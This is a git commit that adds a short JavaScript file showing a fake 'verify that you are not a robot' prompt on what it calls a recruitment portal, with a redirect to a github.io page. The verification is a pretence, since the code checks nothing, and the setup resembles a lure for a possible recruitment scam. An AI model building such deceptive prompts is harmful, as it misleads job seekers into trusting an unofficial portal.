20dcddf3deb49281361eced449e3e2113ca4066a
allregnws <promisebassey8081@gmail.com>
2025-05-03 20:10:25 +0100

    Create ns.js

---
+++ ns.js
@@ -0,0 +1,5 @@
+var password = 'NSO RECRUITMENT'
+password=prompt('SMS :Welcome to our recruitment portal. Click OK to verify that you are not a robot ','NSO RECRUITMENT');
+if (password != 'NSO RECRUITMENT') {
+location.href='https://allregnws.github.io/NSO.Recruitment.Portal.pg';
+}
